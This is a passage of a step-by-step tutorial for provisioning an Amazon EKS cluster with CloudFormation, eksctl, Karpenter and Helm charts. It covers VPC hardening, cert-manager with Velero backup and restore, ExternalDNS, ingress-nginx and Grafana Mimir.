service-linked role for Spot Instances is a one-time operation. Create the AWSServiceRoleForEC2Spot role to use Spot Instances in the Amazon EKS cluster: aws iam create-service-linked-role --aws-service-name spot.amazonaws.com Details: Work with Spot Instances Create Route53 zone and KMS key infrastructure Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Allow direct access to key metadata to the account Effect: Allow Principal: AWS: - !Sub \"arn:${AWS::Partition}:iam::${AWS::AccountId}:root\" Action: - kms:* Resource: \"*\" - Sid: Allow access through EBS for all principals in the account that are authorized to use EBS Effect: Allow Principal: AWS: \"*\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:CreateGrant - kms:DescribeKey Resource: \"*\" Condition: StringEquals: kms:ViaService: !Sub \"ec2.${AWS::Region}.amazonaws.com\" kms:CallerAccount: !Sub \"${AWS::AccountId}\" S3AccessPolicy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"eksctl-${ClusterName}-s3-access-policy\" PolicyDocument: Version: '2012-10-17' Statement: - Effect: Allow Action: - s3:AbortMultipartUpload - s3:DeleteObject - s3:GetObject - s3:ListMultipartUploadParts - s3:ListObjects - s3:PutObject - s3:PutObjectTagging Resource: !Sub \"arn:aws:s3:::${ClusterFQDN}/*\" - Effect: Allow Action: - s3:ListBucket Resource: !Sub \"arn:aws:s3:::${ClusterFQDN}\" Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" S3AccessPolicyArn: Description: IAM policy ARN for S3 access by EKS workloads Value: !Ref S3AccessPolicy Export: Name: Fn::Sub: \"${AWS::StackName}-S3AccessPolicy\" EOF # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\` || OutputKey==\\`S3AccessPolicyArn\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") AWS_S3_ACCESS_POLICY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"S3AccessPolicyArn\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Karpenter infrastructure Use CloudFormation to set up the infrastructure needed by the EKS cluster. See CloudFormation for a complete description of what cloudformation.yaml does for Karpenter. curl -fsSL https://raw.githubusercontent.com/aws/karpenter-provider-aws/refs/heads/main/website/content/en/v1.8/getting-started/getting-started-with-karpenter/cloudformation.yaml &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/cloudformation-karpenter.yml\" eval aws cloudformation deploy \\ --stack-name \"${CLUSTER_NAME}-karpenter\" \\ --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/cloudformation-karpenter.yml\" \\ --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"ClusterName=${CLUSTER_NAME}\" --tags \"${TAGS//,/ }\" Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b accessConfig: accessEntries: - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:role/admin accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster iam: withOIDC: true podIdentityAssociations: - namespace: aws-load-balancer-controller serviceAccountName: aws-load-balancer-controller roleName: eksctl-${CLUSTER_NAME}-aws-load-balancer-controller wellKnownPolicies: awsLoadBalancerController: true - namespace: cert-manager serviceAccountName: cert-manager roleName: eksctl-${CLUSTER_NAME}-cert-manager wellKnownPolicies: certManager: true - namespace: external-dns serviceAccountName: external-dns roleName: eksctl-${CLUSTER_NAME}-external-dns wellKnownPolicies: externalDNS: true - namespace: karpenter serviceAccountName: karpenter roleName: eksctl-${CLUSTER_NAME}-karpenter permissionPolicyARNs: - arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:policy/KarpenterControllerPolicy-${CLUSTER_NAME} - namespace: loki serviceAccountName: loki roleName: eksctl-${CLUSTER_NAME}-loki permissionPolicyARNs: - ${AWS_S3_ACCESS_POLICY_ARN} - namespace: mimir serviceAccountName: mimir roleName: eksctl-${CLUSTER_NAME}-mimir permissionPolicyARNs: - ${AWS_S3_ACCESS_POLICY_ARN} - namespace: tempo serviceAccountName: tempo roleName: eksctl-${CLUSTER_NAME}-tempo permissionPolicyARNs: - ${AWS_S3_ACCESS_POLICY_ARN} - namespace: velero serviceAccountName: velero roleName: eksctl-${CLUSTER_NAME}-velero permissionPolicyARNs: - ${AWS_S3_ACCESS_POLICY_ARN} permissionPolicy: Version: \"2012-10-17\" Statement: - Effect: Allow Action: [ \"ec2:DescribeVolumes\", \"ec2:DescribeSnapshots\", \"ec2:CreateTags\", \"ec2:CreateSnapshot\", \"ec2:DeleteSnapshots\" ] Resource: - \"*\" iamIdentityMappings: - arn: \"arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:role/KarpenterNodeRole-${CLUSTER_NAME}\" username: system:node: groups: - system:bootstrappers - system:nodes addons: - name: coredns - name: eks-pod-identity-agent - name: kube-proxy - name: snapshot-controller - name: aws-ebs-csi-driver configurationValues: |- defaultStorageClass: enabled: true controller: extraVolumeTags: $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") loggingFormat: json - name: vpc-cni configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket instanceType: t4g.medium desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 3 volumeSize: 20 volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} privateNetworking: true nodeRepairConfig: enabled: true bottlerocket: settings: kubernetes: seccomp-default: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" || eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" Enhance the security posture of the EKS cluster by addressing the following concerns: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC should have Route 53 DNS resolver with logging enabled: AWS_CLUSTER_LOG_GROUP_ARN=$(aws logs describe-log-groups --query \"logGroups[?logGroupName=='/aws/eks/${CLUSTER_NAME}/cluster'].arn\" --output text) AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID=$(aws route53resolver create-resolver-query-log-config \\ --name \"${CLUSTER_NAME}-vpc-dns-logs\" \\ --destination-arn \"${AWS_CLUSTER_LOG_GROUP_ARN}\" \\ --creator-request-id \"$(uuidgen)\" --query 'ResolverQueryLogConfig.Id' --output text) aws route53resolver associate-resolver-query-log-config \\ --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID}\" \\ --resource-id \"${AWS_VPC_ID}\" Remove overly permissive NACL rules to follow the principle of least privilege: # Delete the overly permissive inbound rule aws ec2 delete-network-acl-entry \\ --network-acl-id \"${AWS_NACL_ID}\" \\ --rule-number 100 \\ --ingress # Create restrictive inbound TCP rules NACL_RULES=( \"100 443 443 0.0.0.0/0\" \"110 80 80 0.0.0.0/0\" \"120 1024 65535 0.0.0.0/0\" ) for RULE in \"${NACL_RULES[@]}\"; do read -r RULE_NUM PORT_FROM PORT_TO CIDR &lt;&lt;&lt; \"${RULE}\" aws ec2 create-network-acl-entry \\ --network-acl-id \"${AWS_NACL_ID}\" \\ --rule-number \"${RULE_NUM}\" \\ --protocol \"tcp\" \\ --port-range \"From=${PORT_FROM},To=${PORT_TO}\" \\ --cidr-block \"${CIDR}\" \\ --rule-action allow \\ --ingress done # Allow all traffic from VPC CIDR aws ec2 create-network-acl-entry \\ --network-acl-id \"${AWS_NACL_ID}\" \\ --rule-number 130 \\ --protocol \"all\" \\ --cidr-block \"192.168.0.0/16\" \\ --rule-action allow \\ --ingress Prometheus Operator CRDs Prometheus Operator CRDs provides the Custom Resource Definitions (CRDs) that define the Prometheus operator resources. These CRDs are required before installing ServiceMonitor resources. Install the prometheus-operator-crds Helm chart to set up the necessary CRDs: helm install prometheus-operator-crds oci://ghcr.io/prometheus-community/charts/prometheus-operator-crds AWS Load Balancer Controller The AWS Load Balancer Controller is a controller that manages Elastic Load Balancers for a Kubernetes cluster. Install the aws-load-balancer-controller Helm chart and modify its default values: # renovate: datasource=helm depName=aws-load-balancer-controller registryUrl=https://aws.github.io/eks-charts AWS_LOAD_BALANCER_CONTROLLER_HELM_CHART_VERSION=\"1.17.1\" helm repo add --force-update eks https://aws.github.io/eks-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-load-balancer-controller.yml\" &lt;&lt; EOF serviceAccount: name: aws-load-balancer-controller clusterName: ${CLUSTER_NAME} serviceMonitor: enabled: true EOF helm upgrade --install --version \"${AWS_LOAD_BALANCER_CONTROLLER_HELM_CHART_VERSION}\" --namespace aws-load-balancer-controller --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-load-balancer-controller.yml\" aws-load-balancer-controller eks/aws-load-balancer-controller Pod Scheduling PriorityClasses Configure PriorityClasses to control the scheduling priority of pods in your cluster. PriorityClasses allow you to influence which pods are scheduled or evicted first when resources are constrained. These classes help ensure that critical workloads receive scheduling priority over less important workloads. Create custom PriorityClass resources to define priority levels for different workload types: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-scheduling-priorityclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: scheduling.k8s.io/v1 kind: PriorityClass metadata: name: critical-priority value: 100001000 globalDefault: false description: \"This priority class should be used for critical workloads only\" --- apiVersion: scheduling.k8s.io/v1 kind: PriorityClass metadata: name: high-priority value: 100000000 globalDefault: false description: \"This priority class should be used for high priority workloads\" EOF Add Storage Classes and Volume Snapshots Configure persistent storage for your EKS cluster by setting up GP3 storage classes and volume snapshot capabilities. This ensures encrypted, expandable storage with proper backup functionality. tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-storage-snapshot-storageclass-volumesnapshotclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" provisioner: ebs.csi.aws.com parameters: type: gp3 encrypted: \"true\" kmsKeyId: ${AWS_KMS_KEY_ARN} reclaimPolicy: Delete allowVolumeExpansion: true volumeBindingMode: WaitForFirstConsumer --- apiVersion: snapshot.storage.k8s.io/v1 kind: VolumeSnapshotClass metadata: name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" driver: ebs.csi.aws.com deletionPolicy: Delete EOF Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Install the karpenter Helm chart and customize its default values to fit your environment and storage backend: # renovate: datasource=github-tags depName=aws/karpenter-provider-aws KARPENTER_HELM_CHART_VERSION=\"1.8.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF serviceMonitor: enabled: true settings: clusterName: ${CLUSTER_NAME} eksControlPlane: true interruptionQueue: ${CLUSTER_NAME} featureGates: spotToSpotConsolidation: true EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.k8s.aws/v1 kind: EC2NodeClass metadata: name: default spec: amiFamily: Bottlerocket amiSelectorTerms: - alias: bottlerocket@latest subnetSelectorTerms: - tags: karpenter.sh/discovery: \"${CLUSTER_NAME}\" securityGroupSelectorTerms: - tags: karpenter.sh/discovery: \"${CLUSTER_NAME}\" role: \"KarpenterNodeRole-${CLUSTER_NAME}\" tags: Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} --- apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: default spec: template: spec: requirements: # keep-sorted start - key: \"karpenter.k8s.aws/instance-memory\" operator: Gt values: [\"4095\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t4g\", \"t3a\"] - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"arm64\", \"amd64\"] # keep-sorted end nodeClassRef: group: karpenter.k8s.aws kind: EC2NodeClass name: default EOF cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io extractVersion=^(?&lt;version&gt;.+)$ CERT_MANAGER_HELM_CHART_VERSION=\"v1.19.1\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF global: priorityClassName: high-priority crds: enabled: true extraArgs: - --enable-certificate-owner-ref=true serviceAccount: name: cert-manager enableCertificateOwnerRef: true webhook: replicaCount: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/instance: cert-manager app.kubernetes.io/component: webhook topologyKey: kubernetes.io/hostname prometheus: servicemonitor: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Velero Velero is an open-source tool for backing up and restoring Kubernetes cluster resources and persistent volumes. It enables disaster recovery, data migration, and scheduled backups by integrating with cloud storage providers such as AWS S3. Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"11.3.2\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=github-tags depName=vmware-tanzu/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.13.1 volumeMounts: - mountPath: /target name: plugins priorityClassName: high-priority metrics: serviceMonitor: enabled: true prometheusRule: enabled: true spec: - alert: VeleroBackupPartialFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed backups. expr: velero_backup_partial_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed backups. expr: velero_backup_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupSnapshotFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed snapshot backups. expr: increase(velero_volume_snapshot_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning - alert: VeleroRestorePartialFailures annotations: message: Velero restore {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed restores. expr: increase(velero_restore_partial_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning - alert: VeleroRestoreFailures annotations: message: Velero restore {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed restores. expr: increase(velero_restore_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning configuration: backupStorageLocation: - name: provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} volumeSnapshotLocation: - name: provider: aws config: region: ${AWS_DEFAULT_REGION} serviceAccount: server: name: velero credentials: useSecret: false # Create scheduled backup to periodically backup the let's encrypt production resources in the \"cert-manager\" namespace: schedules: monthly-backup-cert-manager-production: labels: letsencrypt: production schedule: \"@monthly\" template: ttl: 2160h includedNamespaces: - cert-manager includedResources: - certificates.cert-manager.io - secrets labelSelector: matchLabels: letsencrypt: production EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" velero vmware-tanzu/velero Restore cert-manager objects The following steps will guide you through restoring a Let’s Encrypt production certificate, previously backed up by Velero to S3, onto a new cluster. Initiate the restore process for the cert-manager objects. while [ -z \"$(kubectl -n velero get backupstoragelocations default -o jsonpath='{.status.lastSyncedTime}')\" ]; do sleep 5; done velero restore create --from-schedule velero-monthly-backup-cert-manager-production --labels letsencrypt=production --wait --existing-resource-policy=update View details about the restore process: velero restore describe --selector letsencrypt=production --details Name: velero-monthly-backup-cert-manager-production-20251030075321 Namespace: velero Labels: letsencrypt=production Annotations: &lt;none&gt; Phase: Completed Total items to be restored: 3 Items restored: 3 Started: 2025-10-30 07:53:22 +0100 CET Completed: 2025-10-30 07:53:24 +0100 CET Backup: velero-monthly-backup-cert-manager-production-20250921155028 Namespaces: Included: all namespaces found in the backup Excluded: &lt;none&gt; Resources: Included: * Excluded: nodes, events, events.events.k8s.io, backups.velero.io, restores.velero.io, resticrepositories.velero.io, csinodes.storage.k8s.io, volumeattachments.storage.k8s.io, backuprepositories.velero.io Cluster-scoped: auto Namespace mappings: &lt;none&gt; Label selector: &lt;none&gt; Or label selector: &lt;none&gt; Restore PVs: auto CSI Snapshot Restores: &lt;none included&gt; Existing Resource Policy: update ItemOperationTimeout: 4h0m0s Preserve Service NodePorts: auto Uploader config: HooksAttempted: 0 HooksFailed: 0 Resource List: cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production(created) v1/Secret: - cert-manager/ingress-cert-production(created) - cert-manager/letsencrypt-production-dns(created) Verify that the certificate was restored properly: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-monthly-backup-cert-manager-production-20250921155028 velero.io/restore-name=velero-monthly-backup-cert-manager-production-20251030075321 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate Metadata: Creation Timestamp: 2025-10-30T06:53:23Z Generation: 1 Resource Version: 5521 UID: 33422558-3105-4936-87d8-468befb5dc2b Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Group: cert-manager.io Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2025-10-30T06:53:23Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2025-12-20T10:53:07Z Not Before: 2025-09-21T10:53:08Z Renewal Time: 2025-11-20T10:53:07Z Events: &lt;none&gt; ExternalDNS ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.20.0\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF serviceAccount: name: external-dns priorityClassName: high-priority serviceMonitor: enabled: true interval: 20s policy: sync domainFilters: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns Ingress NGINX Controller ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.14.1\" helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: config: annotations-risk-level: Critical use-proxy-protocol: true allowSnippetAnnotations: true ingressClassResource: default: true extraArgs: default-ssl-certificate: cert-manager/ingress-cert-production affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/instance: ingress-nginx app.kubernetes.io/component: controller topologyKey: kubernetes.io/hostname replicaCount: 2 service: annotations: # https://www.qovery.com/blog/our-migration-from-kubernetes-built-in-nlb-to-alb-controller/ # https://www.youtube.com/watch?v=xwiRjimKW9c service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} service.beta.kubernetes.io/aws-load-balancer-name: eks-${CLUSTER_NAME} service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: proxy_protocol_v2.enabled=true service.beta.kubernetes.io/aws-load-balancer-type: external metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds{host!=\"_\"}) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention priorityClassName: critical-priority EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx Mimir Grafana Mimir is an open source, horizontally scalable, multi-tenant time series database for Prometheus metrics, designed for high availability and cost efficiency. It enables you to centralize metrics from multiple clusters or environments, and integrates seamlessly with Grafana dashboards for visualization and alerting. Install the mimir-distributed Helm chart and customize its default values to fit your environment and storage backend: # renovate: datasource=helm depName=mimir-distributed registryUrl=https://grafana.github.io/helm-charts MIMIR_DISTRIBUTED_HELM_CHART_VERSION=\"6.1.0-weekly.376\" helm repo add --force-update grafana https://grafana.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mimir-distributed.yml\" &lt;&lt; EOF serviceAccount: name: mimir mimir: structuredConfig: multitenancy_enabled: false limits: compactor_blocks_retention_period: 30d # \"err\":\"server returned HTTP status 400 Bad Request: received a series whose number of labels exceeds the limit (actual: 31, limit: 30) ... (err-mimir-max-label-names-per-series). To adjust the related per-tenant limit, configure -validation.max-label-names-per-series, or contact your service administrator max_label_names_per_series: 50 # Default is 150000 max_global_series_per_user: 300000 common: # https://grafana.com/docs/mimir/v2.17.x/configure/configuration-parameters/ storage: backend: s3 s3: endpoint: s3.${AWS_DEFAULT_REGION}.amazonaws.com region: ${AWS_DEFAULT_REGION} storage_class: ONEZONE_IA alertmanager_storage: s3: bucket_name: ${CLUSTER_FQDN} storage_prefix: mimiralertmanager blocks_storage: s3: bucket_name: ${CLUSTER_FQDN} storage_prefix: mimirblocks ruler_storage: s3: bucket_name: ${CLUSTER_FQDN} storage_prefix: mimirruler alertmanager: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: alertmanager topologyKey: kubernetes.io/hostname distributor: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: distributor topologyKey: kubernetes.io/hostname ingester: zoneAwareReplication: enabled: false replicas: 2 priorityClassName: high-priority affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: ingester topologyKey: kubernetes.io/hostname overrides_exporter: priorityClassName: high-priority ruler: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: ruler topologyKey: kubernetes.io/hostname ruler_querier: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: 